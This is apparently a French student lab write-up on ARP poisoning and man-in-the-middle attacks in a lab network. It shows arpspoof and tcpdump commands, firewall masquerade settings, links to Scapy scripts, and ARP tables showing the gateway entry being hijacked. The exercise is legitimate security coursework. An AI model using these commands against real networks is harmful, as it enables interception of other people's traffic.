# 🌞 Empoisonnez la table ARP de node2.tp1.my  
Ouvrir un terminal dans node2.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.253                ether   00:15:5d:01:01:03   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```
Ouvrir un terminal dans node1.tp1.my  
```bash
sudo tcpdump -w arp_spoof_1.pcap
```

Ouvrir un autre terminal dans node1.tp1.my  
```bash
sudo arpspoof -t 10.1.1.101 10.1.1.253
```

Ouvrir un terminal dans node2.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.253                ether   00:15:5d:01:01:01   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```  
🦈 Capture ARP Spoof --> [arp_spoof_1.pcap](arp_spoof_1.pcap)  


# 🌞 Ecrire un script Scapy qui fait le travail de arpspoof  
Le [script python](./arp_spoof.py)  
🦈 Capture ARP Spoof Scapy --> [arp_spoof_2.pcap](./arp_spoof_2.pcap)  

# 🌞 Mettre en place un MITM ARP  
```bash
sudo firewall-cmd --add-masquerade --permanent  
sudo firewall-cmd --reload  
```  

Ouvrir un terminal dans dhcp.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.101               ether   00:15:5d:01:01:05   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```  

Ouvrir un terminal dans node2.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.253               ether   00:15:5d:01:01:03   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```  

Ouvrir un terminal dans node1.tp1.my  
```bash
sudo tcpdump -w arp_spoof_1.pcap
```  

Ouvrir un terminal dans node1.tp1.my  
Le [script python](./arp_mitm_1.py) 
🦈 Capture ARP Spoof --> [arp_mitm_1.pcap](./arp_mitm_1.pcap)  
  
```bash
sudo python arp_mitm_1.py
```  

Ouvrir un terminal dans node2.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.253                ether  00:15:5d:01:01:01   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```  

Ouvrir un terminal dans dhcp.tp1.my  
```bash
arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.101               ether   00:15:5d:01:01:01   C                     eth0
10.1.1.11                ether   00:15:5d:01:01:04   C                     eth0
10.1.1.100               ether   00:15:5d:01:01:01   C                     eth0
```